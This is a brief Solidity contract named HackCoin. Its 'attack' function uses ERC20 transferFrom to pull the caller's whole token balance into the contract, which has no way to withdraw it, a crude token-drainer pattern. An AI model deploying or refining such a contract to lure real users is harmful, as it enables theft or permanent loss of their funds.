pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract HackCoin {
    function attack(address _token) external {
        IERC20(_token).transferFrom(msg.sender, address(this), IERC20(_token).balanceOf(msg.sender));
    }
}